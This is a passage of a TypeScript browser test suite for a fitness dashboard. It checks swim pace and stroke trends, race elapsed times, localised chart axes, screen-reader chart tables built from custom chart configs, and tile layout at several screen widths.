      x.canvas.closest("[data-widget=steps]"),
    )!;
    return c.scales.y.ticks.map((t) => t.label as string);
  });

/** A 1 km swim of 40 lengths in 25 m. */
const poolLap = (n: number, start: string, duration: string, strokes: number) => ({
  id: 9300 + n,
  name: "Pool Swim",
  type: "lap_swimming",
  sport: "swimming",
  start: `${start} 07:00:00`,
  km: 1,
  duration,
  lengths: 40,
  strokes,
  poolLengthM: 25,
});

describe("small numbers on the boards", () => {
  const swim = {
    id: 9101,
    name: "Pool Swim",
    type: "lap_swimming",
    sport: "swimming",
    start: "2026-10-24 07:00:00",
    km: 1.5,
    duration: "30:00",
  };
  const race = {
    id: 9102,
    name: "Town Race",
    type: "running",
    sport: "running",
    start: "2026-10-20 08:00:00",
    km: 21.1,
    duration: "1:41:16",
    elapsed: "1:45:00",
    race: true,
  };
  const estimatedText = "Some loads are estimates: the activity has no Garmin load.";

  it("shows the swimming pace per 100 m", async () => {
    const { page, errors } = await open(browser, withActivities([swim]), { hash: "#swimming" });
    expect((await kpiTexts(page, "typeKpis"))["Average pace"]?.[0]).toBe("2:00/100 m");
    expect(errors).toEqual([]);
  });

  describe("swim trend", () => {
    const swims = [
      poolLap(6, "2026-10-19", "20:00", 720),
      poolLap(5, "2026-10-12", "20:00", 720),
      poolLap(4, "2026-10-05", "20:00", 720),
      poolLap(3, "2026-09-28", "21:40", 800),
      poolLap(2, "2026-09-21", "21:40", 800),
      poolLap(1, "2026-09-14", "21:40", 800),
    ];
    const openWater = {
      id: 9310,
      name: "Lake Swim",
      type: "open_water_swimming",
      sport: "swimming",
      start: "2026-10-20 07:00:00",
      km: 2.5,
      duration: "55:00",
      swolf: 60,
      strokes: 1500,
    };

    it("compares pace and strokes of one pool length, and leaves out open water", async () => {
      const { page, errors } = await open(browser, withActivities([openWater, ...swims]), {
        hash: "#swimming",
      });
      const kpis = await kpiTexts(page, "swimTrend");
      expect(kpis.Pace?.[0]).toBe("2:00/100 m");
      expect(kpis.Pace?.[1]).toContain("vs the 3 swims before");
      expect(kpis.Pace?.[1]).toContain("▼");
      expect(kpis["Strokes/length"]?.[0]).toBe("18.0");
      const pace = await chartDataset(page, "swimTrend", "Pace");
      const strokes = await chartDataset(page, "swimTrend", "Strokes/length");
      // oldest first, and two colours that differ
      expect(pace.data).toEqual([130, 130, 130, 120, 120, 120]);
      expect(strokes.data).toEqual([20, 20, 20, 18, 18, 18]);
      const colors = await page.evaluate(() =>
        Object.values(window.Chart!.instances)
          .filter((c) => c.canvas.closest("[data-widget=swimTrend]"))
          .flatMap((c) => c.data.datasets.map((d) => d.borderColor)),
      );
      expect(new Set(colors).size).toBe(2);
      const text = await page.innerText("[data-id=swimTrend]");
      expect(text).toContain("Pool swims of 25 m only: 6 swims from");
      expect(text).toContain("Swims left out: 1 (");
      expect(errors).toEqual([]);
    });

    it("shows one swim without a chart or a comparison", async () => {
      const { page, errors } = await open(browser, withActivities([swims[0]]), {
        hash: "#swimming",
      });
      expect(await page.locator("[data-id=swimTrend] canvas").count()).toBe(0);
      const text = await page.innerText("[data-id=swimTrend]");
      expect(text).toContain("2:00/100 m");
      expect(text).not.toContain("swims before");
      expect(text).not.toContain("Swims left out");
      expect(errors).toEqual([]);
    });

    it("shows the mean of the recent swims, a faster pace as good, and up as better on both axes", async () => {
      const { page, errors } = await open(
        browser,
        withActivities([
          poolLap(6, "2026-10-19", "21:00", 760),
          poolLap(5, "2026-10-12", "20:00", 720),
          poolLap(4, "2026-10-05", "19:00", 680),
          ...swims.slice(3),
        ]),
        { hash: "#swimming" },
      );
      const kpis = await kpiTexts(page, "swimTrend");
      // the mean of the 3 newest swims, not the newest one
      expect(kpis.Pace?.[0]).toBe("2:00/100 m");
      expect(kpis["Strokes/length"]?.[0]).toBe("18.0");
      const good = await page.$$eval("[data-id=swimTrend] .kpi .delta", (d) =>
        d.map((x) => x.className),
      );
      expect(good).toHaveLength(2);
      for (const name of good) expect(name).toContain("good");
      const reversed = await page.evaluate(() =>
        Object.values(window.Chart!.instances)
          .filter((c) => c.canvas.closest("[data-id=swimTrend]"))
          .map((c) => [c.options.scales?.y?.reverse, c.options.scales?.y1?.reverse]),
      );
      expect(reversed).toEqual([[true, true]]);
      expect(errors).toEqual([]);
    });

    it("reads slower swims with more strokes as bad", async () => {
      const worse = [
        ...swims.slice(3).map((s, i) => ({ ...s, id: 9320 + i })),
        ...swims.slice(0, 3),
      ];
      const dated = worse.map((s, i) => ({ ...s, start: swims[i].start }));
      const { page, errors } = await open(browser, withActivities(dated), { hash: "#swimming" });
      const bad = await page.$$eval("[data-id=swimTrend] .kpi .delta", (d) =>
        d.map((x) => x.className),
      );
      expect(bad).toHaveLength(2);
      for (const name of bad) expect(name).toContain("bad");
      expect(errors).toEqual([]);
    });

    it("draws 4 swims but compares none: 3 swims against 1 is not like with like", async () => {
      const { page, errors } = await open(browser, withActivities(swims.slice(0, 4)), {
        hash: "#swimming",
      });
      expect(await page.locator("[data-id=swimTrend] canvas").count()).toBe(1);
      expect(await page.innerText("[data-id=swimTrend]")).not.toContain("swims before");
      expect(errors).toEqual([]);
    });

    it("converts pace, distance per stroke and the longest swim to the units of the profile", async () => {
      const file = pageFile({
        data: { ...data, units: "statute_us", activities: [openWater, ...swims] },
      });
      const { page, errors } = await open(browser, file, { hash: "#swimming" });
      const kpis = await kpiTexts(page, "swimTrend");
      // the newest 3 swims: 120 s per 100 m is 109.7 s per 100 yd
      expect(kpis.Pace?.[0]).toBe("1:50/100 yd");
      const pace = await chartDataset(page, "swimTrend", "Pace");
      expect(pace.data[0]).toBeCloseTo(118.9, 1);
      const cells = await page.$$eval("[data-id=swimDetails] tbody tr:first-child td", (c) =>
        c.map((x) => x.textContent),
      );
      expect(cells[8]).toBe("5.47 ft");
      expect(await page.innerText("[data-id=records]")).toContain("1.55 mi");
      expect(errors).toEqual([]);
    });

    it("says that open water has no trend", async () => {
      const { page, errors } = await open(browser, withActivities([openWater]), {
        hash: "#swimming",
      });
      expect(await page.innerText("[data-id=swimTrend]")).toContain("No pool swims with strokes");
      expect(errors).toEqual([]);
    });

    it("adds strokes per length and distance per stroke, n/a in open water", async () => {
      const { page, errors } = await open(browser, withActivities([openWater, swims[0]]), {
        hash: "#swimming",
      });
      const cells = await page.$$eval("[data-id=swimDetails] tbody tr", (r) =>
        r.map((x) => [...x.children].map((c) => c.textContent)),
      );
      // Open water first: no strokes per length; 2,500 m over 1,500 strokes
      expect(cells[0].slice(7, 9)).toEqual(["n/a", "1.67 m"]);
      expect(cells[1].slice(7, 9)).toEqual(["18.0", "1.39 m"]);
      expect(errors).toEqual([]);
    });

    it("names the longest swim in the records of the board", async () => {
      const { page, errors } = await open(browser, withActivities([openWater, swims[0]]), {
        hash: "#swimming",
      });
      const text = await page.innerText("[data-id=records]");
      expect(text).toContain("Longest session · Swim");
      expect(text).toContain("2.50 km");
      expect(text).toContain("Lake Swim");
      expect(errors).toEqual([]);
    });
  });

  it("shows the elapsed time of a race, and the moving time without it", async () => {
    const { page, errors } = await open(browser, withActivities([race]), { hash: "#running" });
    const times = await page.$$eval("[data-id=races] tbody tr", (r) =>
      r.map((x) => [x.children[1].textContent, x.children[3].textContent]),
    );
    expect(times).toContainEqual(["Town Race", "1:45:00"]);
    expect(times).toContainEqual(["City 10K", "49:00"]);
    expect(errors).toEqual([]);
  });

  it("says that a load is an estimate only when one is", async () => {
    const noLoadRun = { ...row(9103, "Easy Run", "2026-10-21 07:00:00") };
    expect(await runKpiText([{ ...noLoadRun, avgHR: 150 }])).toContain(estimatedText);
    expect(await runKpiText([])).not.toContain(estimatedText);
    // no load and no heart rate: there is nothing to estimate from
    expect(await runKpiText([noLoadRun])).not.toContain(estimatedText);
  });

  it("writes the numbers of a chart axis in the language of the page", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({ settings: { languages: ["en", "it"] } }),
      { hash: "#walking", locale: "en-US" },
    );
    // an English browser, an Italian page
    await page.click(".account summary");
    await page.selectOption("#lang", "it");
    const italian = await stepsAxis(page);
    expect(italian.some((l) => /^\d+\.\d{3}$/.test(l))).toBe(true);
    expect(italian.some((l) => l.includes(","))).toBe(false);
    // the change of language draws the axis again
    await page.selectOption("#lang", "en");
    expect((await stepsAxis(page)).some((l) => /^\d+,\d{3}$/.test(l))).toBe(true);
    expect(errors).toEqual([]);
  });
});

/** The body rows of the screen-reader table of a tile, as the texts of their cells. */
const tableRows = (page: Page, id: string) =>
  page.$$eval(`[data-id=${id}] .sr-only tbody tr`, (trs) =>
    trs.map((r) => [...r.children].map((c) => c.textContent)),
  );

/** A chart config for a custom widget: one dataset of `values` on the labels. */
const cfg = (values: string, options = "", labels = '["a", "b"]') =>
  `{ type: "bar", data: { labels: ${labels}, datasets: [{ label: "x", data: ${values} }] }, options: { ${options} } }`;
const yTicks = (fn: string) => `scales: { y: { ticks: { callback: ${fn} } } }`;
const POINTS = '[{x:"b",y:2},{x:"c",y:3},{x:"c",y:4}]';
const ABC = '["a", "b", "c"]';
const PLAIN = [
  ["a", "1"],
  ["b", "2"],
];

/** The table rows of a custom widget that draws `config`. */
async function customTable(config: string): Promise<(string | null)[][]> {
  const { page, errors } = await open(
    browser,
    pageFile({ widgets: [custom("tbl", `ctx.chart(el, ${config});`)], layout: on("tbl") }),
  );
  const body = await tableRows(page, "tbl");
  expect(await page.$$(".tile .error")).toEqual([]);
  expect(errors).toEqual([]);
  return body;
}

describe("chart table", () => {
  it("shows a bedtime as the clock time of the chart", async () => {
    const { page, errors } = await open(browser, pageFile(), { hash: "#recovery" });
    expect((await tableRows(page, "bedtime"))[0]).toEqual(["Oct 13", "23:39"]);
    expect(errors).toEqual([]);
  });

  it("shows a pace as the chart does and keeps a heart rate a number", async () => {
    const { page, errors } = await open(browser, pageFile(), { hash: "#walking" });
    const weeks = await tableRows(page, "walkDetails");
    // 3432 s over 5.97 km is 574.9 s/km; the heart rate axis has no tick text
    expect(weeks.find((r) => r[0] === "Oct 19")).toEqual(["Oct 19", "9:35", "98"]);
    expect(weeks.find((r) => r[0] === "Aug 10")).toEqual(["Aug 10", "", ""]);
    expect(errors).toEqual([]);
  });

  it("writes the numbers in the language of the page", async () => {
    const en = await open(browser, pageFile(), { hash: "#walking" });
    expect((await tableRows(en.page, "steps"))[0][1]).toBe("11,276");
    const ital = await open(browser, pageFile({ settings: { languages: ["it"] } }), {
      hash: "#walking",
    });
    expect((await tableRows(ital.page, "steps"))[0][1]).toBe("11.276");
    expect(ital.errors).toEqual([]);
  });

  it.each<[string, string, (string | null)[][]]>([
    [
      "labels and plain values",
      cfg("[1.234, 2]"),
      [
        ["a", "1.23"],
        ["b", "2"],
      ],
    ],
    [
      "a callback",
      cfg("[1, 2]", yTicks('(v) => v + " km"')),
      [
        ["a", "1 km"],
        ["b", "2 km"],
      ],
    ],
    [
      "the horizontal axis of a horizontal chart",
      cfg("[1, 2]", `indexAxis: "y", scales: { x: { ticks: { callback: (v) => v + " kg" } } }`),
      [
        ["a", "1 kg"],
        ["b", "2 kg"],
      ],
    ],
    [
      "not the label axis of a horizontal chart",
      cfg("[1, 2]", `indexAxis: "y", ${yTicks('(v) => v + " kg"')}`),
      PLAIN,
    ],
    [
      "a callback that throws when called without the ticks of a chart",
      cfg("[1, 2]", yTicks("(v, i, ticks) => { if (!ticks) throw new Error('x'); return v; }")),
      PLAIN,
    ],
    [
      "a callback that needs the scale",
      cfg("[1, 2]", yTicks("function (v) { return this.getLabelForValue(v); }")),
      PLAIN,
    ],
    ["a callback that gives an array", cfg("[1, 2]", yTicks("(v) => [v, 'x']")), PLAIN],
    ["a callback that gives null", cfg("[1, 2]", yTicks("() => null")), PLAIN],
    ["a callback that is not a function", cfg("[1, 2]", yTicks('"x"')), PLAIN],
    [
      "an object that is not a point",
      cfg("[{ a: 1 }, 2]"),
      [
        ["a", ""],
        ["b", "2"],
      ],
    ],
    [
      "a floating bar as its two ends",
      cfg("[[1, 3], 2]"),
      [
        ["a", "1,3"],
        ["b", "2"],
      ],
    ],
    [
      "a value that is a string",
      cfg('["5", 2]'),
      [
        ["a", "5"],
        ["b", "2"],
      ],
    ],
    [
      "a callback that gives a number",
      cfg("[1, 2]", yTicks("(v) => v * 10")),
      [
        ["a", "10"],
        ["b", "20"],
      ],
    ],
    [
      "points by label",
      cfg(POINTS, "", ABC),
      [
        ["a", ""],
        ["b", "2"],
        ["c", "3, 4"],
      ],
    ],
    [
      "points by label with a callback",
      cfg(POINTS, yTicks('(v) => v + "s"'), ABC),
      [
        ["a", ""],
        ["b", "2s"],
        ["c", "3s, 4s"],
      ],
    ],
    [
      "gaps",
      cfg("[null, 2]"),
      [
        ["a", ""],
        ["b", "2"],
      ],
    ],
    [
      "labels as they are, a number without a thousands mark and null as nothing",
      cfg("[1, 2]", "", "[2024, null]"),
      [
        ["2024", "1"],
        ["", "2"],
      ],
    ],
  ])("chart table reads %s", async (_name, config, expected) => {
    expect(await customTable(config)).toEqual(expected);
  });

  it("reads a second axis by its own callback", async () => {
    const got = await customTable(`{ type: "bar", data: { labels: ["a"], datasets: [
      { label: "x", data: [1] },
      { label: "y", data: [2], yAxisID: "y1" }] },
      options: { scales: { y1: { ticks: { callback: (v) => v + " bpm" } } } } }`);
    expect(got).toEqual([["a", "1", "2 bpm"]]);
  });

  it("reads the second value axis of a horizontal chart", async () => {
    const got = await customTable(`{ type: "bar", data: { labels: ["a"], datasets: [
      { label: "x", data: [1] },
      { label: "y", data: [2], xAxisID: "x1" }] },
      options: { indexAxis: "y", scales: { x1: { ticks: { callback: (v) => v + " kg" } } } } }`);
    expect(got).toEqual([["a", "1", "2 kg"]]);
  });

  it("keeps the x: y rows of a scatter chart without labels", async () => {
    const got = await customTable(
      `{ type: "scatter", data: { datasets: [{ label: "x", data: [{ x: 1, y: 2 }] }] } }`,
    );
    expect(got).toEqual([["1", "1: 2"]]);
  });

  it("shows nothing for a scatter value without an x", async () => {
    const got = await customTable(
      `{ type: "scatter", data: { datasets: [{ label: "x", data: [{ y: 2 }] }] } }`,
    );
    expect(got).toEqual([["1", ""]]);
  });

  it("shows nothing for a scatter value without a y", async () => {
    const got = await customTable(
      `{ type: "scatter", data: { datasets: [{ label: "x", data: [{ x: 1 }] }] } }`,
    );
    expect(got).toEqual([["1", ""]]);
  });
});

describe("board rows", () => {
  it.each([1280, 1000])("are full and of one height on every tab at %d px", async (width) => {
    const { page, errors } = await open(browser, pageFile(), {
      viewport: { width, height: 900 },
    });
    const list = await page.$$eval("[role=tab]", (els) =>
      els.map((e) => e.getAttribute("data-tab")!),
    );
    expect(list.length).toBeGreaterThan(3);
    for (const tab of list) {
      await page.click(`[data-tab=${tab}]`);
      await page.waitForSelector(`[role=tabpanel][aria-labelledby=tab-${tab}]`);
      for (const shownRow of await gridRows(page)) {
        expect({ tab, ...shownRow }).toEqual({ tab, ids: shownRow.ids, heights: 1, gap: 0 });
      }
    }
    expect(errors).toEqual([]);
  });

  it("finds a lone tile by the shown tiles and their shown width on a tablet", async () => {
    const boards = {
      all: [
        { id: "activities", widget: "activities", span: 1 },
        { id: "hrv", widget: "hrv", span: 1 },
        { id: "sleep", widget: "sleep", span: 1, hidden: true },
        { id: "bedtime", widget: "bedtime", span: 1 },
        { id: "stress", widget: "bodyBattery", span: 1 },
      ],
    };
    const { page, errors } = await open(
      browser,
      pageFile({ layout: { rev: "w", base: "preset", seen: MET, boards } }),
      { viewport: { width: 1000, height: 900 } },
    );
    // Activities needs 2 columns, so HRV pairs with Bedtime past the hidden tile; the last is alone
    expect(
      await page.$$eval(".wide-tablet", (els) => els.map((e) => (e as HTMLElement).dataset.id)),
    ).toEqual(["stress"]);
    expect((await gridRows(page)).map((r) => r.gap)).toEqual([0, 0, 0]);
    expect(errors).toEqual([]);
  });

  it("gives a lone tile its width back in edit mode, so the width slider stays true", async () => {
    const { page, errors } = await open(browser, pageFile(), {
      viewport: { width: 1000, height: 900 },
      hash: "#running",
    });
    const zones = "[data-id=hrZones]";
    expect(await page.getAttribute(zones, "class")).toContain("wide-tablet");
    await startEdit(page);
    expect(await page.getAttribute(zones, "class")).not.toContain("wide-tablet");
    expect(await page.getAttribute(`${zones} .resize`, "aria-valuenow")).toBe("1");
    expect(errors).toEqual([]);
  });

  it("stacks a lone tile in one column on a phone", async () => {
    const { page, errors } = await open(browser, pageFile(), {
      viewport: { width: 390, height: 800 },
      hash: "#running",
    });
    expect(await page.getAttribute("[data-id=hrZones]", "class")).toContain("wide-tablet");
    const grid = await page.$eval(".grid", (e) => e.getBoundingClientRect().width);
    const widths = await page.$$eval(".grid > .tile", (els) =>
      els.map((e) => e.getBoundingClientRect().width),
    );
    expect(new Set(widths)).toEqual(new Set([grid]));
    expect(errors).toEqual([]);
  });
});
